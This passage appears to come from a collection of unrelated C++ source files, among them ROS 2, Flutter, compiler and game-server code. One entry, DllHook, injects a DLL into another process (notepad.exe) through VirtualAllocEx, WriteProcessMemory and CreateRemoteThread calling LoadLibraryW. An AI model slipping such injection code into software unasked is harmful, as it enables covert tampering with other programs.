%s\", config_.enable_vehicle_status ? \"true\" : \"false\");\n    RCLCPP_INFO(this->get_logger(), \" - registration_port_remote: %d\", config_.registration_port_remote);\n    RCLCPP_INFO(this->get_logger(), \" - registration_port_local: %d\", config_.registration_port_local);\n    RCLCPP_INFO(this->get_logger(), \" - vehicle_status_port_local: %d\", config_.vehicle_status_port_local);\n    RCLCPP_INFO(this->get_logger(), \" - siren_and_light_status_port_remote: %d\", config_.siren_and_light_status_port_remote);\n    RCLCPP_INFO(this->get_logger(), \" - traffic_event_port_local: %d\", config_.traffic_event_port_local);\n\n\n    boost::system::error_code ec;\n    bool init_successful = mosaic_client_.initialize(config_, ec);\n\n    if (!init_successful) {\n        if (ec) {\n            RCLCPP_ERROR(this->get_logger(), \"MosaicClient initialization failed with error: %s\", ec.message().c_str());\n            throw std::runtime_error(\"Failed to initialize MosaicClient: \" + ec.message());\n        } else {\n            RCLCPP_ERROR(this->get_logger(), \"MosaicClient initialization failed due to an unknown issue.\");\n            throw std::runtime_error(\"Failed to initialize MosaicClient due to an unknown issue.\");\n        }\n    } else {\n        RCLCPP_INFO(this->get_logger(), \"MosaicClient initialized successfully.\");\n    }\n\n    gps_pub_ = this->create_publisher<gps_msgs::msg::GPSFix>(\"vehicle_pose\", 10);\n    twist_pub_ = this->create_publisher<geometry_msgs::msg::TwistStamped>(\"velocity\", 10);\n    time_pub_ = this->create_publisher<rosgraph_msgs::msg::Clock>(\"/sim_clock\", 10);\n    traffi",
    "#include <iostream>\nusing namespace std;\nstruct Node {\n    int data;\n    Node* next;\n};\nclass Stack {\nprivate:\n    Node* top;\npublic:\n    Stack() {\n        top = nullptr;\n    }\n    ~Stack() {\n        while (top != nullptr) {\n            Node* temp = top;\n            top = top->next;\n            delete temp;\n        }\n    }\n    bool isEmpty() {\n        return top == nullptr;\n    }\n    void push(int data) {\n        Node* newNode = new Node();\n        newNode->data = data;\n        newNode->next = top;\n        top = newNode;\n    }\n\n    int pop() {\n        if (isEmpty()) {\n            cout << \"Stack is empty. Cannot pop.\" << endl;\n            return -1;\n        }\n        int data = top->data;\n        Node* temp = top;\n        top = top->next;\n        delete temp;\n        return data;\n    }\n    int peek() {\n        if (isEmpty()) {\n            cout << \"Stack is empty. Cannot peek.\" << endl;\n            return -1;\n        }\n        return top->data;\n    }\n};\n\nint main() {\n    Stack stack;\n    stack.push(1);\n    stack.push(2);\n    stack.push(3);\n    stack.push(4);\n    cout << \"Top element: \" << stack.peek() << endl;\n    cout << \"Popped element: \" << stack.pop() << endl;\n    cout << \"Popped element: \" << stack.pop() << endl;\n    cout << \"Popped element: \" << stack.pop() << endl;\n    cout << \"Popped element: \" << stack.pop() << endl; \n\n    return 0;\n}",
    "#pragma GCC optimize(\"O3\")\n#include <bits/stdc++.h>\n#ifndef ONLINE_JUDGE\n#include \"F:\\Codeforces\\debug.h\"\n#else\n#define dbg(x...)\n#define dbgc(x...)\n#endif\nusing namespace std;\n\n#define int long long\n#define float long double\n#define vf(v) (v).begin(), (v).end()\n#define vr(v) (v).rbegin(), (v).rend()\n#define endl \"\\n\"\n#define fastio ios_base::sync_with_stdio(false)\n#define in cin.tie(NULL)\n#define out cout.tie(NULL)\n// #include <ext/pb_ds/assoc_container.hpp>\n\nint mod = 1000000007;\nint inf = 1e18;\n\nconst int N = 1e6 + 5;\n\nvector<int> primes;\n\nvoid sieve(int n) {\n  vector<bool> is_prime(n, true);\n  is_prime[0] = is_prime[1] = false;\n  for (int i = 2; i * i <= n; i++) {\n    if (is_prime[i]) {\n      for (int j = i * i; j <= n; j += i) {\n        is_prime[j] = false;\n      }\n    }\n  }\n  for (int i = 2; i <= n; i++) {\n    if (is_prime[i]) {\n      primes.push_back(i);\n    }\n  }\n}\n\nint findNumberofarray(int n, int i, vector<int>& primes, vector<int>& a, int m) {\n  if (a.size() == m + 1)\n    return 0;\n  if (i == primes.size())\n    return 0;\n  a.push_back(primes[i]);\n  int cnt = 0;\n  int p = 1;\n  bool flag = true;\n  int sz = a.size()-1;\n  for(int j=0;j<a.size()/2;j++){\n     if(a[j]!=a[sz-j]){\n        flag = false;\n     }\n  }\n\n  for(int k:a){\n    p*=k;\n  }\n\n  if (a.size() <= m && p <= n and flag) {\n    cnt += ((1 + (findNumberofarray(n, i + 1, primes, a, m) + findNumberofarray(n, i, primes, a, m)))%mod);\n    // dbg(cnt,a);\n  }\n  a.pop_back();\n  cnt += (findNumberofarray(n, i + 1, primes, a, m)%mod);\n  return cnt%mod;\n}\n\nint32_t main() {\n  fastio;\n  in;\n  out;\n  int t = 1;\n  // cin >> t;\n  while (t--) {\n    int n;\n    cin >> n;\n    sieve(n);\n    int q;\n    cin >> q;\n    while (q--) {\n      int m;\n      cin >> m;\n      vector<int> a;\n      cout << findNumberofarray(n, 0, primes, a, m) << \" \";\n    }\n  }\n  return 0;\n}",
    "#include \"DllHook.h\"\r\nvoid WINAPI DllHook::SetHook()\r\n{\r\n\tstd::wstring szPath;\r\n\tLPSETHOOK lproc;\r\n\tHINSTANCE hDll;\r\n\tBOOL bRet;\r\n\tPROCESS_INFORMATION info;\r\n\tSTARTUPINFO start;\r\n\tmemset(&start, 0, sizeof(start));\r\n\tszPath = _T(\"C://Users//YOURNAME//source//repos//Ldll//x64//Debug//Ldll.dll\");\r\n\thDll = LoadLibraryW(szPath.c_str());\r\n\tif (hDll != NULL)\r\n\t{\r\n\t\tlproc = (LPSETHOOK)GetProcAddress(hDll, \"SetHook\");\r\n\t\tif (lproc != NULL)\r\n\t\t{\r\n\t\t\tstd::wstring str = _T(\"C://Windows//System32//notepad.exe\");\r\n\t\t\tbRet = CreateProcess(NULL,\r\n\t\t\t\tconst_cast<wchar_t*>(str.c_str()),\r\n\t\t\t\tNULL,\r\n\t\t\t\tNULL,\r\n\t\t\t\tTRUE,\r\n\t\t\t\t0,\r\n\t\t\t\tNULL,\r\n\t\t\t\tNULL,\r\n\t\t\t\t&start,\r\n\t\t\t\t&info);\r\n\t\t\tif (bRet != 0)\r\n\t\t\t{\r\n\t\t\t\tif (((*lproc)(info.dwThreadId)) == false)\r\n\t\t\t\t{\r\n\t\t\t\t\tstd::wstring message = L\"Sethook\";\r\n\t\t\t\t\tDllHook::ShowError(GetLastError(), const_cast<LPTSTR>(message.c_str()));\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tstd::wstring message = L\"CreateProcess\";\r\n\t\t\t\tDllHook::ShowError(GetLastError(), const_cast<LPTSTR>(message.c_str()));\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\nvoid WINAPI DllHook::UnSetHook()\r\n{\r\n\t std::wstring szPath;\r\n\t LPSETHOOK lproc;\r\n\t HINSTANCE hDll;\r\n\r\n\t szPath = _T(\"C://Users//YOURNAME//source//repos//Ldll//x64//Debug//Ldll.dll\");\r\n\t hDll = LoadLibrary(szPath.c_str());\r\n\t if (hDll != NULL)\r\n\t {\r\n\t\t lproc = (LPSETHOOK)GetProcAddress(hDll, \"SetHook\");\r\n\t\t if (lproc != NULL)\r\n\t\t\t (*lproc)(0);\r\n\t }\r\n}\r\nBOOL WINAPI DllHook::LoadLib(DWORD dwProcessId, LPWSTR lpszLibName)\r\n{\r\n\tHANDLE hProcess = NULL;\r\n\tHANDLE hThread = NULL;\r\n\tLPWSTR lpszRemoteFile = NULL;\r\n\thProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwProcessId);\r\n\tif (hProcess == NULL)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"OpenProcess\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\tlpszRemoteFile = (LPWSTR)VirtualAllocEx(hProcess, NULL, sizeof(WCHAR) * lstrlenW(lpszLibName) + 1, MEM_COMMIT, PAGE_READWRITE);\r\n\tif (lpszRemoteFile == NULL)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"VirtualAllocEx\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (!WriteProcessMemory(hProcess, lpszRemoteFile, (PVOID)lpszLibName, sizeof(WCHAR) * lstrlenW(lpszLibName) + 1, NULL))\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"WriteProcessMemory\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\tPTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"), \"LoadLibraryW\");\r\n\tif (pfnThreadRtn == NULL)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"GetProcAddress\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\thThread = CreateRemoteThread(hProcess,\r\n\t\tNULL,\r\n\t\t0,\r\n\t\tpfnThreadRtn, \r\n\t\tlpszRemoteFile,\r\n\t\t0,\r\n\t\tNULL);\r\n\tif (hThread == NULL)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"CreateRemoteThread\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\tWaitForSingleObject(hThread, INFINITE);\r\n\tVirtualFreeEx(hProcess, lpszRemoteFile, 0, MEM_RELEASE);\r\n\tCloseHandle(hThread);\r\n\tCloseHandle(hProcess);\r\n\treturn TRUE;\r\n}\r\nBOOL WINAPI DllHook::FreeLib(DWORD dwProcessId, LPTSTR lpszLibName)\r\n{\r\n\tHANDLE hProcess = NULL,\r\n\t       hThread = NULL,\r\n\t       hthSnapshot = NULL;\r\n\tMODULEENTRY32 hMod = {sizeof(hMod)};\r\n\tBOOL bFound = FALSE;\r\n\ththSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,\r\n\t                                       dwProcessId);\r\n\tif (hthSnapshot == NULL)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"CreateToolhelp32Snapshot\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\tBOOL bMoreMods = Module32First(hthSnapshot, &hMod);\r\n\tif (bMoreMods == FALSE)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"Module32First\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\tfor (; bMoreMods; bMoreMods = Module32Next(hthSnapshot, &hMod))\r\n\t{\r\n\t\tif ((wcscmp(hMod.szExePath, lpszLibName) == 0) ||\r\n\t\t\t(wcscmp(hMod.szModule, lpszLibName) == 0))\r\n\t\t{\r\n\t\t\tbFound = TRUE;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\tif (!bFound)\r\n\t{\r\n\t\tMessageBox(nullptr, L\"\u00c4\u00a3\u00bf\u00e9\u00b2\u00bb\u00b4\u00e6\u00d4\u00da\", L\"\", MB_OK);\r\n\t\tCloseHandle(hthSnapshot);\r\n\t\treturn FALSE;\r\n\t}\r\n\thProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,\r\n\t                       FALSE, dwProcessId);\r\n\tif (hProcess == NULL)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"OpenProcess\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\tPTHREAD_START_ROUTINE pfnThreadRtn =\r\n\t\t(PTHREAD_START_ROUTINE)GetProcAddress(\r\n\t\t\tGetModuleHandle(L\"Kernel32.dll\"), \"FreeLibrary\");\r\n\tif (pfnThreadRtn == NULL)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"GetProcAddress\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\thThread = CreateRemoteThread(hProcess,\r\n\t                             NULL,\r\n\t                             0,\r\n\t                             pfnThreadRtn,\r\n\t                             hMod.modBaseAddr,\r\n\t                             0,\r\n\t                             NULL);\r\n\tif (hThread == NULL)\r\n\t{\r\n\t\tShowError(GetLastError(), const_cast<LPTSTR>(L\"CreateRemoteThread\"));\r\n\t\treturn FALSE;\r\n\t}\r\n\tWaitForSingleObject(hThread, INFINITE);\r\n\tCloseHandle(hThread);\r\n\tCloseHandle(hthSnapshot);\r\n\tCloseHandle(hProcess);\r\n\treturn TRUE;\r\n}\r\nDWORD DllHook::GetProcessId(LPCWSTR lpName, std::wstring& errMsg)\r\n{\r\n\tDWORD dwPid = 0;\r\n\tHANDL",
    "#include \"AST.h\"\n#include <cstdarg>\nusing namespace std;\n\n\n// SYM sym;\n// int TEMP = 0;\nint SCOPE_INDEX = 0;\n// string CUR_INFO = \"\";\n// int CUR_INSTR = 0;\n// BasicBlock *CUR_BB = NULL;\n// FuncModule *CUR_FUNC = NULL;\nBasicBlock *WHILE_ENTRY = NULL;\nBasicBlock *WHILE_END = NULL;\n\n\nValue *expNode::Exp2IR(){\n    if(op == '='){AssignOp2IR(this); return NULL;} // AssignOp\n    else if(op < _INTEGER){\n        if(op == '>' || op == '<'){return CmpOp2IR(op, this);}\n        else{return BinaryOp2IR(op, this);}\n    }\n    else if(op > _AND && op < _PRINT){return CmpOp2IR(op, this);}\n    else if(op == _AND || op == _OR){return CondOp2IR(op, this);} // CondOp\n    else if(op == _ConstDefs || op == _VarDefs){Defs2IR(this); return NULL;} // DefsOp\n    else if(op == _CompUnits){CompUnits2IR(this); return NULL;} // CompUnits\n    else if(op == _BlockItems){BlockItems2IR(this); return NULL;} // Block\n    else if(op == _RETURN){ReturnOp2IR(this); return NULL;} // ReturnOp\n    else if(op == _IF){IfOp2IR(this); return NULL;} // IfOp\n    else if(op == _WHILE){WhileOp2IR(this); return NULL;} // WhileOp\n    else if(op == _BREAK){BreakOp2IR(this); return NULL;} // BreakOp\n    else if(op == _CONTINUE){ContinueOp2IR(this); return NULL;} // ContinueOp\n    else if(op == _FuncDef){FuncDef2IR(this); return NULL;} // FuncDef\n    else if(op == _ArrayExp){return ArrayExp2IR(this, true);} // ArrayExp\n    else if(op == _FuncCall){return FuncCall2IR(this);}\n    else if(op == _PRINT){Print2IR(this); return NULL;} // PrintOp\n    else{return NULL;}\n}\n\nValue *astNode::AST2IR(){\n    if(type == Exp){return node.exp_node.Exp2IR();}\n    else if(type == I){return IntConstant2IR(this);}\n    else if(type == F){return FloatConstant2IR(this);}\n    else if(type == Id){return SimpleId2IR(&node.ident_node, true);}\n    else{return NULL;}\n}\n\nvoid astNode::AST_delete(){\n    if(type == Exp){\n        for(int i = 0; i < node.exp_node.num; i++){\n            node.exp_node.pNodes[i]->AST_delete();\n            delete node.exp_node.pNodes[i];\n        }\n    }\n}\n\n\n/* funcs related to preprocessing */\nvoid sym_preprocess_datadef(int val_type, astNode *p){\n    expNode *pNode = &(p->node.exp_node);\n    for(int i = 0; i < pNode->num; i++){\n        astNode *p1 = pNode->pNodes[i];\n        astNode *obj = p1->node.exp_node.pNodes[0];\n        astNode *val = NULL;\n        if(p1->node.exp_node.num > 1){val = p1->node.exp_node.pNodes[1];}\n        if(obj->type == Id){sym_preprocess_simple(val_type, obj, val, false);}\n        else{\n            if(obj->node.exp_node.op == _ArrayDef){sym_preprocess_array(val_type, obj, false);}\n            else{exit(-5);}\n        }\n    }\n}\n\nvoid sym_preprocess_simple(int val_type, astNode *p1, astNode *p2, bool b){\n    identNode *pNode = &(p1->node.ident_node);\n\n    valueStruct *vS = new valueStruct(val_type, Simple, false, 0);\n    if(vS == NULL){exit(-1);}\n    pNode->val_type = val_type;\n    if(sym_insert(sym, pNode->name, vS) < 0){exit(-6);}\n\n    if(val_type == CONST_F32 || val_type == CONST_I32){\n        if(p2){\n            if(p2->type == I){\n                if(val_type == CONST_I32){vS->val.i = p2->node.int_node.value;}\n                else{vS->val.f = (float)p2->node.int_node.value;}\n            }\n            else if(p2->type == F){\n                if(val_type == CONST_I32){vS->val.i = (int)p2->node.float_node.value;}\n                else{vS->val.f = p2->node.float_node.value;}\n            }\n            else if(p2->type == Id && p2->node.ident_node.sym_type == Simple){\n                float result = 0;\n                if(!Cal4SimpleId(&(p2->node.ident_node), result)){exit(-7);}\n                if(val_type == CONST_I32){vS->val.i = (int)result;}\n                else{vS->val.f = result;}\n            }\n            else{exit(-7);}\n        }\n        return;\n    }\n\n    identInfo *iI = new identInfo();\n    if(iI == NULL){exit(-1);}\n    iI->name = pNode->name, iI->sym_type = Simple, iI->val_type = val_type;\n    iI->scope_index = sym.cur;\n    if(b){\n        sym.Stack[sym.Stack[sym.cur]->root]->fparam_list.push_back(iI);\n        vS->def_mark = true;\n    }\n    else{sym.Stack[sym.Stack[sym.cur]->root]->ident_list.push_back(iI);}\n\n    /*\n    vS for simple ident:\n    val_type\n    sym_type: Simple\n    def_mark\n    val: value of the ident\n    */\n\n   Value *V = new Value(Mem, \"@\" + pNode->name + \"_\" + to_string(sym.cur), *vS);\n   if(!sym.cur){V->isGlobal = true;}\n   vS->V = V, iI->V = V;\n}\n\nvoid sym_preprocess_array(int val_type, astNode *p, bool b){\n    expNode *pNode = &(p->node.exp_node);\n    identNode *pNode1 = &(pNode->pNodes[0]->node.ident_node);\n\n    valueStruct *vS = new valueStruct(val_type, Array, false, pNode->num - 1);\n    if(vS == NULL){exit(-1);}\n    pNode1->val_type = val_type;\n    vS->val.i = sym.Array_list.size();\n    if(sym_insert(sym, pNode1->name, vS) < 0){exit(-8);}\n\n    arrayStruct *aS = new arrayStruct();\n    if(aS == NULL){exit(-1);}\n    aS->val_type = val_type;\n    aS->dim_list.resize(pNode->num - 1);\n    for(int i = 1; i < pNode->num; i++){\n  ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flash_chat_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include \"field.h\"\n\n#include <chrono>\n#include <iostream>\n#include <ranges>\n\n#include \"client_session.h\"\n#include \"header.h\"\n#include \"packet.h\"\n#include \"packet_handler.h\"\n#include \"packets.h\"\n#include \"player.h\"\n\nField::Field() {\n  for (int i = 0; i < kSectorHeight; ++i) {\n    _sector.resize(kSectorHeight);\n    _sector[i].resize(kSectorWidth);\n\n    for (int j = 0; j < kSectorWidth; ++j) {\n      _sector[i][j].reserve(100);\n    }\n  }\n\n  _last_tick = GetTickCount64();\n}\n\nvoid Field::Update(const size_t delta) {\n  for (const auto& player : _players | std::views::values) {\n    if (player->IsMoving()) {\n      player->Move(delta);\n    }\n  }\n}\n\nbool Field::AddPlayer(const std::shared_ptr<Player>& player) {\n  if (!_players.emplace(player->GetSessionId(), player).second) {\n    std::cerr << \"Failed to add player\\n\";\n    return false;\n  }\n\n  const auto& pos = player->GetPosition();\n  _sector[pos.sector_y][pos.sector_x].emplace(player->GetSessionId(), player);\n\n  return true;\n}\n\nvoid Field::RemovePlayer(const int32_t id) {\n  if (!_players.contains(id)) {\n    return;\n  }\n\n  const auto& player = _players.at(id);\n  const auto& pos = player->GetPosition();\n  _sector[pos.sector_y][pos.sector_x].erase(id);\n  _players.erase(id);\n}\n\nvoid Field::UpdatePosition(const std::shared_ptr<Player>& player) {\n  const auto& old_pos = player->GetOldPosition();\n  const auto& pos = player->GetPosition();\n\n  if (old_pos.sector_x != pos.sector_x || old_pos.sector_y != pos.sector_y) {\n    _sector[old_pos.sector_y][old_pos.sector_x].erase(player->GetSessionId());\n    _sector[pos.sector_y][pos.sector_x].emplace(player->GetSessionId(), player);\n  }\n}\n\nstd::optional<std::shared_ptr<Player>> Field::FindPlayer(const int32_t id) const {\n  if (_players.contains(id)) {\n    return std::make_optional(_players.at(id));\n  }\n\n  return std::nullopt;\n}\n\nstd::vector<std::shared_ptr<Player>> Field::GetAroundPlayers(const std::shared_ptr<Player>& player) const {\n  std::vector<std::shared_ptr<Player>> around_players;\n\n  const auto& pos = player->GetPosition();\n\n  for (int i = pos.sector_y - kVisibleSectorHeight; i <= pos.sector_y + kVisibleSectorHeight; ++i) {\n    for (int j = pos.sector_x - kVisibleSectorWidth; j <= pos.sector_x + kVisibleSectorWidth; ++j) {\n      if (i < 0 || i >= kSectorHeight || j < 0 || j >= kSectorWidth) {\n        continue;\n      }\n\n      for (const auto& target : _sector[i][j] | std::views::values) {\n        if (target->GetSessionId() == player->GetSessionId()) {\n          continue;\n        }\n\n        around_players.emplace_back(target);\n      }\n    }\n  }\n\n  return around_players;\n}\n\nconst std::vector<std::vector<std::unordered_map<int32_t, std::shared_ptr<Player>>>>& Field::GetGrid() const {\n  return _sector;\n}\n\nvoid Field::OnPlayerEnter(const std::shared_ptr<Player>& player) {\n  SendCreateCharacters(player);\n  SendCreateOtherCharacters(player);\n}\n\nvoid Field::OnPlayerExit(const std::shared_ptr<Player>& player) {\n  SendDeleteCharacter(player);\n}\n\nvoid Field::SendCreateCharacters(const std::shared_ptr<Player>& player) const {\n  const sc::CreateOtherCharacter create = {player->GetSessionId(), static_cast<uint8_t>(player->GetDir()), player->GetPosition().x, player->GetPosition().y, static_cast<uint8_t>(player->GetHp())};\n  const auto packet = PacketHandler::Serialize(create);\n  BroadcastAround(player, packet, true);\n}\n\nvoid Field::SendCreateOtherCharacters(const std::shared_ptr<Player>& player) const {\n  const auto& pos = player->GetPosition();\n\n  for (int i = pos.sector_y - kVisibleSectorHeight; i <= pos.sector_y + kVisibleSectorHeight; ++i) {\n    for (int j = pos.sector_x - kVisibleSectorWidth; j <= pos.sector_x + kVisibleSectorWidth; ++j) {\n      if (i < 0 || i >= kSectorHeight || j < 0 || j >= kSectorWidth) {\n        continue;\n      }\n\n      for (const auto& target : _sector[i][j] | std::views::values) {\n        if (target->GetSessionId() == player->GetSessionId()) {\n          continue;\n        }\n\n        const sc::CreateOtherCharacter create = {target->GetSessionId(), static_cast<uint8_t>(target->GetDir()), target->GetPosition().x, target->GetPosition().y, static_cast<uint8_t>(target->GetHp())};\n        const auto packet = PacketHandler::Serialize(create);\n        player->GetSession()->Send(packet, packet->GetDataSize() + sizeof(Header));\n      }\n    }\n  }\n}\n\nvoid Field::SendDeleteCharacter(const std::shared_ptr<Player>& player) const {\n  const sc::DeleteCharacter remove = {player->GetSessionId()};\n  const auto packet = PacketHandler::Serialize(remove);\n  BroadcastAround(player, packet, true);\n}\n\nvoid Field::BroadcastAround(const std::shared_ptr<Player>& player, const std::shared_ptr<Packet>& packet, const bool except_me) const {\n  const auto& pos = player->GetPosition();\n\n  for (int i = pos.sector_y - kVisibleSectorHeight; i <= pos.sector_y + kVisibleSectorHeight; ++i) {\n    for (int j = pos.sector_x - kVisibleSectorWidth; j <= pos.sector_x + kVisibleSectorWidth; ++j) {\n      if (i < 0 || i >= kSectorHeight || j < 0 || j >= kSectorWi",
    "#include \"win32_window.h\"\r\n\r\n#include <dwmapi.h>\r\n#include <flutter_windows.h>\r\n\r\n#include \"resource.h\"\r\n\r\nnamespace {\r\n\r\n/// Window attribute that enables dark mode window decorations.\r\n///\r\n/// Redefined in case the developer's machine has a Windows SDK older than\r\n/// version 10.0.22000.0.\r\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\r\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\r\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\r\n#endif\r\n\r\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\r\n\r\n/// Registry key for app theme preference.\r\n///\r\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\r\n/// value indicates apps should use light mode.\r\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\r\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\r\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\r\n\r\n// The number of Win32Window objects that currently exist.\r\nstatic int g_active_window_count = 0;\r\n\r\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\r\n\r\n// Scale helper to convert logical scaler values to physical using passed in\r\n// scale factor\r\nint Scale(int source, double scale_factor) {\r\n  return static_cast<int>(source * scale_factor);\r\n}\r\n\r\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\r\n// This API is only needed for PerMonitor V1 awareness mode.\r\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\r\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\r\n  if (!user32_module) {\r\n    return;\r\n  }\r\n  auto enable_non_client_dpi_scaling =\r\n      reinterpret_cast<EnableNonClientDpiScaling*>(\r\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\r\n  if (enable_non_client_dpi_scaling != nullptr) {\r\n    enable_non_client_dpi_scaling(hwnd);\r\n  }\r\n  FreeLibrary(user32_module);\r\n}\r\n\r\n}  // namespace\r\n\r\n// Manages the Win32Window's window class registration.\r\nclass WindowClassRegistrar {\r\n public:\r\n  ~WindowClassRegistrar() = default;\r\n\r\n  // Returns the singleton registar instance.\r\n  static WindowClassRegistrar* GetInstance() {\r\n    if (!instance_) {\r\n      instance_ = new WindowClassRegistrar();\r\n    }\r\n    return instance_;\r\n  }\r\n\r\n  // Returns the name of the window class, registering the class if it hasn't\r\n  // previously been registered.\r\n  const wchar_t* GetWindowClass();\r\n\r\n  // Unregisters the window class. Should only be called if there are no\r\n  // instances of the window.\r\n  void UnregisterWindowClass();\r\n\r\n private:\r\n  WindowClassRegistrar() = default;\r\n\r\n  static WindowClassRegistrar* instance_;\r\n\r\n  bool class_registered_ = false;\r\n};\r\n\r\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\r\n\r\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\r\n  if (!class_registered_) {\r\n    WNDCLASS window_class{};\r\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\r\n    window_class.lpszClassName = kWindowClassName;\r\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\r\n    window_class.cbClsExtra = 0;\r\n    window_class.cbWndExtra = 0;\r\n    window_class.hInstance = GetModuleHandle(nullptr);\r\n    window_class.hIcon =\r\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\r\n    window_class.hbrBackground = 0;\r\n    window_class.lpszMenuName = nullptr;\r\n    window_class.lpfnWndProc = Win32Window::WndProc;\r\n    RegisterClass(&window_class);\r\n    class_registered_ = true;\r\n  }\r\n  return kWindowClassName;\r\n}\r\n\r\nvoid WindowClassRegistrar::UnregisterWindowClass() {\r\n  UnregisterClass(kWindowClassName, nullptr);\r\n  class_registered_ = false;\r\n}\r\n\r\nWin32Window::Win32Window() {\r\n  ++g_active_window_count;\r\n}\r\n\r\nWin32Window::~Win32Window() {\r\n  --g_active_window_count;\r\n  Destroy();\r\n}\r\n\r\nbool Win32Window::Create(const std::wstring& title,\r\n                         const Point& origin,\r\n                         const Size& size) {\r\n  Destroy();\r\n\r\n  const wchar_t* window_class =\r\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\r\n\r\n  const POINT target_point = {static_cast<LONG>(origin.x),\r\n                              static_cast<LONG>(origin.y)};\r\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\r\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\r\n  double scale_factor = dpi / 96.0;\r\n\r\n  HWND window = CreateWindow(\r\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\r\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\r\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\r\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\r\n\r\n  if (!window) {\r\n    return false;\r\n  }\r\n\r\n  UpdateTheme(window);\r\n\r\n  return OnCreate();\r\n}\r\n\r\nbool Win32Window::Show() {\r\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\r\n}\r\n\r\n// static\r\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\r\n                                      UINT const message,\r\n                                      WPARAM const wparam,\r\n               ",
